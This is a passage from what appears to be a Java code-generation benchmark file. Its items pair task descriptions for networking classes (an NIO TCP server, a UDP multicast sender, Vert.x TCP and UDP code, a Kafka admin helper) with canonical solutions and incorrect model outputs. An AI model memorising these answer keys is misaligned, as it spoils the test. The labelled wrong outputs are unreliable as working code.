name;\\nthis.type = type;\\nthis.publicKey = publicKey;\"\n      }\n    }\n  ]\n}"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data, and sends responses back to clients.\n\nClass Description: The Server class implements a Component interface and provides non-blocking TCP server functionality using Java NIO channels and selectors. It manages client connections, reads incoming data in a length-prefixed format, processes commands, and writes responses back to clients.\n\nAttributes:\n- SERVER_PORT: [int] - The port number on which the server listens for incoming connections\n- conMan: [NIOConnectionManager] - Manages NIO connections and selection operations\n- acceptor: [ServerSocketChannel] - The main server socket channel that accepts incoming connections\n- dhts: [Collection<DHT>] - Collection of DHT instances used for command processing\n\nMethods:\n- start([Collection<DHT> dhts, ConfigReader config]) -> [void] - Initializes the server by creating a non-blocking ServerSocketChannel, binding it to the specified port, and registering it with the connection manager\n- stop() -> [void] - Stops the server by closing the ServerSocketChannel and releasing resources\n- accept() -> [void] - Accepts new client connections, configures them as non-blocking, and registers them with the connection manager for read/write operations\n- read() -> [void] - Reads data from a client channel in a length-prefixed format (4-byte header followed by payload)\n- process([ByteBuffer buf]) -> [void] - Processes the received data buffer by decoding it and executing the appropriate command\n- write() -> [void] - Writes response data back to the client channel\n- calcInterestOps() -> [int] - Calculates the current interest operations (OP_READ/OP_WRITE) for the selection key\n- selectionEvent([SelectionKey key]) -> [void] - Handles selection events (readable/writable) for client channels\n- registrationEvent([NIOConnectionManager manager, SelectionKey key]) -> [void] - Handles registration events with the connection manager\n- getChannel() -> [SelectableChannel] - Returns the associated channel (either server or client channel)\n- doStateChecks([long now]) -> [void] - Performs periodic state checks (currently empty implementation)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectableChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Paths;\nimport java.util.Collection;\nimport java.util.Deque;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentLinkedDeque;\n\nimport lbms.plugins.mldht.kad.DHT;\nimport lbms.plugins.mldht.utils.NIOConnectionManager;\nimport lbms.plugins.mldht.utils.Selectable;\nimport the8472.bencode.BDecoder;\nimport the8472.mldht.Component;\nimport the8472.utils.ConfigReader;\n\npublic class Server implements Component {\n\t\n\tpublic static int SERVER_PORT = 33348;\n\t\n\tNIOConnectionManager conMan = new NIOConnectionManager(\"CLI-server\");\n\tServerSocketChannel acceptor;\n\tCollection<DHT> dhts;\n\t\n\t@Override\n\tpublic void start(Collection<DHT> dhts, ConfigReader config) {\n\t\tthis.dhts = dhts;\n\t\t\n\t\ttry {\n\t\t\tacceptor = ServerSocketChannel.open();\n\t\t\tacceptor.configureBlocking(false);\n\t\t\tacceptor.setOption(StandardSocketOptions.SO_REUSEADDR, true);\n\t\t\tacceptor.bind(new InetSocketAddress(InetAddress.getLoopbackAddress(), SERVER_PORT));\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(key.isAcceptable())\n\t\t\t\t\t\taccept();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn acceptor;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\treturn SelectionKey.OP_ACCEPT;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\tvoid accept() {\n\t\ttry {\n\t\t\tSocketChannel chan = acceptor.accept();\n\t\t\tchan.configureBlocking(false);\n\t\t\tchan.socket().setSoTimeout(0);\n\t\t\tchan.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\tByteBuffer header = ByteBuffer.allocate(4);\n\t\t\t\tByteBuffer payload = null;\n\t\t\t\tByteBuffer currentReadTarget = header;\n\t\t\t\tDeque<ByteBuffer> writes = new ConcurrentLinkedDeque<>();\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(!chan.isOpen()) {\n\t\t\t\t\t\tconMan.deRegister(this);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t\tif(key.isValid() && key.isReadable())\n\t\t\t\t\t\tread();\n\t\t\t\t\tif(key.isValid() && key.isWritable())\n\t\t\t\t\t\twrite();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid read() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tint read = chan.read(currentReadTarget);\n\t\t\t\t\t\t\n\t\t\t\t\t\tif(read == -1) {\n\t\t\t\t\t\t\theader = null;\n\t\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\tif(currentReadTarget.remaining() == 0) {\n\t\t\t\t\t\t\tcurrentReadTarget.flip();\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif(currentReadTarget == header) {\n\t\t\t\t\t\t\t\tpayload = ByteBuffer.allocate(header.getInt(0));\n\t\t\t\t\t\t\t\tcurrentReadTarget = payload;\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tprocess(payload);\n\t\t\t\t\t\t\t\tpayload = null;\n\t\t\t\t\t\t\t\theader.clear();\n\t\t\t\t\t\t\t\tcurrentReadTarget = header;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t}\t\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid process(ByteBuffer buf) {\n\t\t\t\t\tBDecoder decoder = new BDecoder();\n\t\t\t\t\tMap<String, Object> map = decoder.decode(buf);\n\t\t\t\t\tList<byte[]> args = (List<byte[]>) map.get(\"arguments\");\n\t\t\t\t\tCommandProcessor processor = CommandProcessor.from(args, (b) -> {\n\t\t\t\t\t\tByteBuffer h = ByteBuffer.allocate(4);\n\t\t\t\t\t\th.putInt(0, b.remaining());\n\t\t\t\t\t\tsynchronized (writes) {\n\t\t\t\t\t\t\twrites.add(h);\n\t\t\t\t\t\t\twrites.add(b);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t}, dhts);\n\t\t\t\t\tprocessor.currentWorkDir = Paths.get(new String((byte[])map.get(\"cwd\"), StandardCharsets.UTF_8));\n\t\t\t\t\tprocessor.active = chan::isOpen;\n\t\t\t\t\ttry {\n\t\t\t\t\t\tprocessor.process();\n\t\t\t\t\t} catch(Exception e) {\n\t\t\t\t\t\tprocessor.handleException(e);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid write() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\twhile (!writes.isEmpty()) {\n\t\t\t\t\t\t\tif (!writes.peekFirst().hasRemaining()) {\n\t\t\t\t\t\t\t\twrites.removeFirst();\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tlong written = chan.write(writes.stream().toArray(ByteBuffer[]::new));\n\t\t\t\t\t\t\tif (written == 0)\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\n\t\t\t\t\tif(writes.isEmpty())\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn chan;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\tint ops = 0;\n\t\t\t\t\tif(header != null)\n\t\t\t\t\t\tops = SelectionKey.OP_READ;\n\t\t\t\t\tif(writes.peek() != null)\n\t\t\t\t\t\tops |= SelectionKey.OP_WRITE;\n\t\t\t\t\treturn ops;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\t@Override\n\tpublic void stop() {\n\t\ttry {\n\t\t\tacceptor.close();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Collection;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class Server implements Component {\n    private static final int SERVER_PORT = 8080;\n    private NIOConnectionManager conMan;\n    private ServerSocketChannel acceptor;\n    private Collection<DHT> dhts;\n\n    public void start(Collection<DHT> dhts, ConfigReader config) {\n        this.dhts = dhts;\n        try {\n            acceptor = ServerSocketChannel.open();\n            acceptor.configureBlocking(false);\n            acceptor.bind(new InetSocketAddress(SERVER_PORT));\n            conMan = new NIOConnectionManager(acceptor);\n            conMan.registerForRead(acceptor);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (acceptor != null) {\n                acceptor.close();\n            }\n            if (conMan != null) {\n                conMan.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void accept() {\n        try {\n            SocketChannel client = acceptor.accept();\n            if (client != null) {\n                client.configureBlocking(false);\n                conMan.registerForRead(client);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void read() {\n        try {\n            Set<SelectionKey> keys = conMan.getSelector().selectedKeys();\n            Iterator<SelectionKey> it = keys.iterator();\n            while (it.hasNext()) {\n                SelectionKey key = it.next();\n                if (key.isReadable()) {\n                    SocketChannel client = (SocketChannel) key.channel();\n                    ByteBuffer buf = ByteBuffer.allocate(4);\n                    client.read(buf);\n                    buf.flip();\n                    int length = buf.getInt();\n                    buf = ByteBuffer.allocate(length);\n                    client.read(buf);\n                    buf.flip();\n                    process(buf);\n                }\n                it.remove();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void process(ByteBuffer buf) {\n        // Process the received data buffer and execute commands\n    }\n\n    public void write() {\n        try {\n            Set<SelectionKey> keys = conMan.getSelector().selectedKeys();\n            Iterator<SelectionKey> it = keys.iterator();\n            while (it.hasNext()) {\n                SelectionKey key = it.next();\n                if (key.isWritable()) {\n                    SocketChannel client = (SocketChannel) key.channel();\n                    ByteBuffer response = ByteBuffer.wrap(\"Response\".getBytes());\n                    client.write(response);\n                }\n                it.remove();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public int calcInterestOps() {\n        return SelectionKey.OP_READ | SelectionKey.OP_WRITE;\n    }\n\n    public void selectionEvent(SelectionKey key) {\n        if (key.isReadable()) {\n            read();\n        } else if (key.isWritable()) {\n            write();\n        }\n    }\n\n    public void registrationEvent(NIOConnectionManager manager, SelectionKey key) {\n        // Handle registration events\n    }\n\n    public SelectableChannel getChannel() {\n        return acceptor;\n    }\n\n    public void doStateChecks(long now) {\n        // Perform periodic state checks\n    }\n}\n```"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Create a Java class that implements a multicast sender using UDP with Java NIO's DatagramChannel for non-blocking communication. The class should support both IPv4 and IPv6 protocols and allow sending messages to a multicast group.\n\nClass Description: The MulticastSender class is responsible for sending messages to a multicast group using UDP. It utilizes Java NIO's DatagramChannel for efficient non-blocking communication and supports configuration of TTL (Time To Live) for multicast packets. The class handles both IPv4 and IPv6 protocols automatically based on the system's IP stack type.\n\nAttributes:\n- sock: [DatagramSocket] - The underlying DatagramSocket used for communication\n- mcast_addr: [InetAddress] - The multicast address to send messages to\n- bind_addr: [InetAddress] - The local address to bind to\n- mcast_port: [int] - The multicast port number\n- local_port: [int] - The local port number to bind to\n- ttl: [int] - Time To Live for multicast packets\n- prot_family: [ProtocolFamily] - The protocol family (INET or INET6) determined by the system's IP stack\n\nMethods:\n- MulticastSender: [Constructor](InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) -> [void] - Initializes the multicast sender with binding address, ports, multicast address, and TTL\n- start: [start]() -> [void] - Starts the sender, binds to the specified address and port, and begins reading input from stdin to send as multicast messages\n- bindToInterfaces: [bindToInterfaces](List<NetworkInterface> interfaces, MulticastSocket s) -> [void] - Helper method to bind multicast socket to multiple network interfaces (currently unused in main flow)",
    "Canonical_solution": "import org.jgroups.util.StackType;\nimport org.jgroups.util.Util;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.channels.DatagramChannel;\nimport java.util.Collections;\nimport java.util.List;\n\npublic class MulticastSender {\n    protected DatagramSocket sock;\n    protected InetAddress mcast_addr;\n    protected InetAddress bind_addr;\n    protected int mcast_port;\n    protected final int local_port;\n    protected final int ttl;\n    protected static final ProtocolFamily prot_family;\n\n    static {\n        StackType ip_version = Util.getIpStackType();\n        prot_family = ip_version == StackType.IPv6 ? StandardProtocolFamily.INET6 : StandardProtocolFamily.INET;\n    }\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n    }\n\n    public void start() throws Exception {\n        DatagramChannel channel = null;\n        try {\n            channel = DatagramChannel.open(prot_family)\n                    .setOption(StandardSocketOptions.IP_MULTICAST_TTL, ttl)\n                    .bind(new InetSocketAddress(bind_addr, local_port));\n            sock = channel.socket();\n\n            DataInputStream in = new DataInputStream(System.in);\n            while(true) {\n                System.out.print(\"> \");\n                try {\n                    String line = Util.readLine(in);\n                    byte[] buf = line.getBytes();\n                    DatagramPacket packet = new DatagramPacket(buf, buf.length, mcast_addr, mcast_port);\n                    sock.send(packet);\n                }\n                catch(Throwable t) {\n                    t.printStackTrace();\n                }\n            }\n        }\n        finally {\n            if(channel != null)\n                channel.close();\n        }\n    }\n\n    protected void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) {\n        SocketAddress tmp_mcast_addr = new InetSocketAddress(mcast_addr, mcast_port);\n        for(NetworkInterface intf: interfaces) {\n            try {\n                s.joinGroup(tmp_mcast_addr, intf);\n            }\n            catch(IOException e) {\n                System.err.printf(\"failed joining interface %s: %s\\n\", intf, e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.List;\n\npublic class MulticastSender {\n    private DatagramSocket sock;\n    private InetAddress mcast_addr;\n    private InetAddress bind_addr;\n    private int mcast_port;\n    private int local_port;\n    private int ttl;\n    private ProtocolFamily prot_family;\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) throws IOException {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n        this.prot_family = (bind_addr instanceof Inet6Address) ? StandardProtocolFamily.INET6 : StandardProtocolFamily.INET;\n    }\n\n    public void start() throws IOException {\n        sock = new DatagramSocket(local_port, bind_addr);\n        sock.setSoTimeout(1000);\n        sock.setBroadcast(true);\n        sock.setTimeToLive(ttl);\n\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        BufferedReader input = new BufferedReader(new InputStreamReader(System.in));\n\n        while (true) {\n            String line = input.readLine();\n            if (line == null) break;\n            byte[] data = line.getBytes();\n            buffer.clear();\n            buffer.put(data);\n            buffer.flip();\n            DatagramPacket packet = new DatagramPacket(buffer.array(), data.length, mcast_addr, mcast_port);\n            sock.send(packet);\n        }\n    }\n\n    private void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) throws IOException {\n        for (NetworkInterface iface : interfaces) {\n            s.setInterface(iface);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 450,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Vert.x framework to handle multiple client connections, process incoming data, and manage server lifecycle operations.\n\nClass Description: The VertxTcpServer class provides functionality to start, stop, and manage a TCP server using Vert.x. It handles client connections, processes incoming data with echo functionality, and manages connection events.\n\nAttributes:\n- server: [NetServer] - The Vert.x NetServer instance that manages TCP connections\n\nMethods:\n- startServer(Vertx vertx, int port, String host) -> void - Initializes and starts the TCP server on specified host and port\n- handleConnection(NetSocket socket) -> void - Handles incoming client connections, processes data, and manages connection events\n- stopServer() -> void - Gracefully shuts down the TCP server\n\nMethod Details:\n1. startServer(Vertx vertx, int port, String host) -> void\n   - Input Parameters:\n     - vertx: Vertx - The Vert.x instance\n     - port: int - The port number to listen on\n     - host: String - The host address to bind to\n   - Description: Configures server options, creates NetServer instance, sets up connection handler, and starts listening for connections\n\n2. handleConnection(NetSocket socket) -> void\n   - Input Parameters:\n     - socket: NetSocket - The client connection socket\n   - Description: Sets up handlers for incoming data (echoes back received data), connection closure, and exceptions\n\n3. stopServer() -> void\n   - Description: Closes the server and all active connections, with completion handler for success/failure notification",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.buffer.Buffer;\n\npublic class VertxTcpServer {\n\n    private NetServer server;\n\n    public void startServer(Vertx vertx, int port, String host) {\n        NetServerOptions options = new NetServerOptions().setPort(port).setHost(host);\n        server = vertx.createNetServer(options);\n\n        server.connectHandler(socket -> {\n            handleConnection(socket);\n        });\n\n        server.listen().onComplete(res -> {\n            if (res.succeeded()) {\n                System.out.println(\"Server is now listening on port: \" + port);\n            } else {\n                System.out.println(\"Failed to bind: \" + res.cause().getMessage());\n            }\n        });\n    }\n\n    private void handleConnection(NetSocket socket) {\n        socket.handler(buffer -> {\n            System.out.println(\"Received data: \" + buffer.length() + \" bytes\");\n            socket.write(Buffer.buffer(\"Echo: \").appendBuffer(buffer));\n        });\n\n        socket.closeHandler(v -> {\n            System.out.println(\"Connection closed\");\n        });\n\n        socket.exceptionHandler(err -> {\n            System.err.println(\"Connection error: \" + err.getMessage());\n        });\n    }\n\n    public void stopServer() {\n        if (server != null) {\n            server.close().onComplete(res -> {\n                if (res.succeeded()) {\n                    System.out.println(\"Server closed successfully\");\n                } else {\n                    System.err.println(\"Failed to close server: \" + res.cause().getMessage());\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "public class VertxTcpServer {\n    private NetServer server;\n\n    public void startServer(Vertx vertx, int port, String host) {\n        server = vertx.createNetServer();\n        server.connectHandler(this::handleConnection).listen(port, host, ar -> {\n            if (ar.succeeded()) {\n                System.out.println(\"TCP server started on \" + host + \":\" + port);\n            } else {\n                System.err.println(\"Failed to start TCP server: \" + ar.cause().getMessage());\n            }\n        });\n    }\n\n    public void handleConnection(NetSocket socket) {\n        socket.handler(buffer -> {\n            System.out.println(\"Received data: \" + buffer.toString());\n            socket.write(buffer);\n        });\n\n        socket.closeHandler(v -> {\n            System.out.println(\"Client disconnected\");\n        });\n\n        socket.exceptionHandler(Throwable::printStackTrace);\n    }\n\n    public void stopServer() {\n        if (server != null) {\n            server.close(ar -> {\n                if (ar.succeeded()) {\n                    System.out.println(\"TCP server stopped successfully\");\n                } else {\n                    System.err.println(\"Failed to stop TCP server: \" + ar.cause().getMessage());\n                }\n            });\n        }\n    }\n}"
  },
  {
    "Task_id": 451,
    "Instruction": "Task Description: Create a Java class that implements a clustered event bus using Vert.x TCP server for inter-process communication, handling message delivery between distributed components.\n\nClass Description: The ClusteredEventBus class extends EventBusImpl to provide clustered event bus functionality using Vert.x's TCP server capabilities. It manages TCP connections, processes incoming messages, and delivers them locally within the cluster.\n\nAttributes:\n- options: [EventBusOptions] - Configuration options for the event bus including port, host, and other TCP settings\n- server: [NetServer] - The Vert.x TCP server instance that handles incoming connections\n\nMethods:\n- ClusteredEventBus([VertxInternal vertx, VertxOptions options]) -> [void] - Constructor that initializes the clustered event bus with Vertx instance and options\n- getServerOptions() -> [NetServerOptions] - Creates and returns NetServerOptions based on the event bus configuration\n- start([Promise<Void> promise]) -> [void] - Starts the TCP server and sets up connection handlers\n- getServerHandler() -> [Handler<NetSocket>] - Creates and returns the handler for processing incoming TCP connections and messages\n- getClusterPort() -> [int] - Returns the configured cluster port from options\n- getClusterHost() -> [String] - Returns the configured cluster host address from options or default address if not specified",
    "Canonical_solution": "import io.vertx.core.*;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.parsetools.RecordParser;\n\npublic class ClusteredEventBus extends EventBusImpl {\n\n  private final EventBusOptions options;\n  private NetServer server;\n\n  public ClusteredEventBus(VertxInternal vertx, VertxOptions options) {\n    super(vertx);\n    this.options = options.getEventBusOptions();\n  }\n\n  private NetServerOptions getServerOptions() {\n    return new NetServerOptions(this.options.toJson());\n  }\n\n  @Override\n  public void start(Promise<Void> promise) {\n    NetServerOptions serverOptions = getServerOptions();\n    server = vertx.createNetServer(serverOptions);\n    server.connectHandler(getServerHandler());\n    int port = getClusterPort();\n    String host = getClusterHost();\n    server.listen(port, host).onComplete(promise);\n  }\n\n  private Handler<NetSocket> getServerHandler() {\n    return socket -> {\n      RecordParser parser = RecordParser.newFixed(4);\n      Handler<Buffer> handler = new Handler<Buffer>() {\n        int size = -1;\n\n        public void handle(Buffer buff) {\n          if (size == -1) {\n            size = buff.getInt(0);\n            parser.fixedSizeMode(size);\n          } else {\n            ClusteredMessage received = new ClusteredMessage(ClusteredEventBus.this);\n            received.readFromWire(buff, codecManager);\n            parser.fixedSizeMode(4);\n            size = -1;\n            if (received.codec() == CodecManager.PING_MESSAGE_CODEC) {\n              socket.write(PONG);\n            } else {\n              deliverMessageLocally(received);\n            }\n          }\n        }\n      };\n      parser.setOutput(handler);\n      socket.handler(parser);\n    };\n  }\n\n  private int getClusterPort() {\n    return options.getPort();\n  }\n\n  private String getClusterHost() {\n    String host;\n    if ((host = options.getHost()) != null) {\n      return host;\n    }\n    return AddressHelper.defaultAddress();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "public class ClusteredEventBus extends EventBusImpl {\n    private final EventBusOptions options;\n    private final NetServer server;\n\n    public ClusteredEventBus(VertxInternal vertx, VertxOptions options) {\n        super(vertx, options);\n        this.options = (EventBusOptions) options.getEventBusOptions();\n        this.server = vertx.createNetServer(getServerOptions());\n    }\n\n    private NetServerOptions getServerOptions() {\n        NetServerOptions options = new NetServerOptions();\n        options.setPort(this.options.getPort());\n        options.setHost(this.options.getHost());\n        return options;\n    }\n\n    public void start(Promise<Void> promise) {\n        server.connectHandler(getServerHandler()).listen(ar -> {\n            if (ar.succeeded()) {\n                promise.complete();\n            } else {\n                promise.fail(ar.cause());\n            }\n        });\n    }\n\n    private Handler<NetSocket> getServerHandler() {\n        return socket -> {\n            socket.handler(buffer -> {\n                String message = buffer.toString();\n                // Process and deliver the message locally within the cluster\n                deliverMessage(message);\n            });\n        };\n    }\n\n    private int getClusterPort() {\n        return options.getPort();\n    }\n\n    private String getClusterHost() {\n        return options.getHost() != null ? options.getHost() : \"localhost\";\n    }\n}"
  },
  {
    "Task_id": 453,
    "Instruction": "Task Description: Implement a function that demonstrates UDP communication using Vert.x in Java, allowing sending of data packets to a specified target address and port, with success/failure notification.\n\nFunction Description: The function creates a UDP socket using Vert.x, configures it with default options, and demonstrates two ways to send data: using a Buffer object and directly using a String. It includes asynchronous result handling to report whether each send operation succeeded.\n\nInput:\n- vertx: Vertx - The Vert.x instance used to create the UDP socket\n\nOutput: None (The function's output is the side effect of sending UDP packets and printing success/failure messages to the console)",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\n\npublic void example2(Vertx vertx) {\n    DatagramSocket socket = vertx.createDatagramSocket(new DatagramSocketOptions());\n    Buffer buffer = Buffer.buffer(\"content\");\n    socket\n      .send(buffer, 1234, \"10.0.0.1\")\n      .onComplete(asyncResult -> System.out.println(\"Send succeeded? \" + asyncResult.succeeded()));\n    socket\n      .send(\"A string used as content\", 1234, \"10.0.0.1\")\n      .onComplete(asyncResult -> System.out.println(\"Send succeeded? \" + asyncResult.succeeded()));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 14,
    "wrong_result": "Vertx vertx = vertx;\nDatagramSocket socket = vertx.createDatagramSocket();\nsocket.listen(0, \"0.0.0.0\", ar -> {\n  if (ar.succeeded()) {\n    System.out.println(\"UDP socket bound to port \" + ar.result().actualPort());\n    String message = \"Hello from Vert.x UDP!\";\n    String targetHost = \"127.0.0.1\";\n    int targetPort = 8080;\n    Buffer buffer = Buffer.buffer(message);\n    socket.send(buffer, targetPort, targetHost, res -> {\n      if (res.succeeded()) {\n        System.out.println(\"Sent buffer successfully to \" + targetHost + \":\" + targetPort);\n      } else {\n        System.out.println(\"Failed to send buffer to \" + targetHost + \":\" + targetPort + \": \" + res.cause().getMessage());\n      }\n    });\n    socket.send(message, targetPort, targetHost, res -> {\n      if (res.succeeded()) {\n        System.out.println(\"Sent string successfully to \" + targetHost + \":\" + targetPort);\n      } else {\n        System.out.println(\"Failed to send string to \" + targetHost + \":\" + targetPort + \": \" + res.cause().getMessage());\n      }\n    });\n  } else {\n    System.out.println(\"Failed to bind UDP socket: \" + ar.cause().getMessage());\n  }\n});"
  },
  {
    "Task_id": 456,
    "Instruction": "Task Description: Create a Java class that provides administrative operations for Kafka topics, including retrieving configurations for individual topics, multiple topics, and all topics in a Kafka cluster.\n\nClass Description: The KafkaAdminTopicConfigProvider class is designed to interact with Kafka's AdminClient to perform topic configuration operations. It provides methods to fetch topic configurations either for a single topic, a set of topics, or all topics in the cluster. The class handles timeouts and errors gracefully and converts Kafka Config objects into standard Java Properties objects.\n\nAttributes:\n- _clusterConfigs: [Properties] - Stores configuration properties for the Kafka cluster\n- _adminClient: [AdminClient] - The Kafka AdminClient instance used to perform administrative operations\n- DESCRIBE_CLUSTER_CONFIGS_TIMEOUT: [Duration] - Constant defining the timeout duration for describeConfigs operations (90 seconds)\n- LOG: [Logger] - Logger instance for logging debug and warning messages\n\nMethods:\n- topicConfigs: [String topic] -> [Properties] - Retrieves configuration properties for a single specified topic. Returns empty Properties if retrieval fails.\n- topicConfigs: [Set<String> topics] -> [Map<String, Properties>] - Retrieves configurations for multiple topics specified in the input set. Returns a map of topic names to their configurations.\n- allTopicConfigs: [] -> [Map<String, Properties>] - Retrieves configurations for all topics in the Kafka cluster. Returns an empty map if retrieval fails.\n- convertConfigToProperties: [Config config] -> [Properties] - Helper method that converts a Kafka Config object into a Java Properties object, filtering out null entries.",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.Set;\nimport java.util.concurrent.ExecutionException;\nimport java.util.stream.Collectors;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.clients.admin.ConfigEntry;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.protocol.Errors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class KafkaAdminTopicConfigProvider {\n  private static final Logger LOG = LoggerFactory.getLogger(KafkaAdminTopicConfigProvider.class);\n  public static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n  protected Properties _clusterConfigs;\n  protected AdminClient _adminClient;\n\n  public Properties topicConfigs(String topic) {\n    Config topicConfig = null;\n    ConfigResource topicResource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n    try {\n      LOG.debug(\"Requesting details for topic '{}'\", topic);\n      topicConfig = _adminClient\n              .describeConfigs(Collections.singletonList(topicResource))\n              .all()\n              .get()\n              .get(topicResource);\n    } catch (ExecutionException ee) {\n      if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n        LOG.warn(\"Failed to retrieve configuration for topic '{}' due to describeConfigs request time out.\", topic);\n      } else 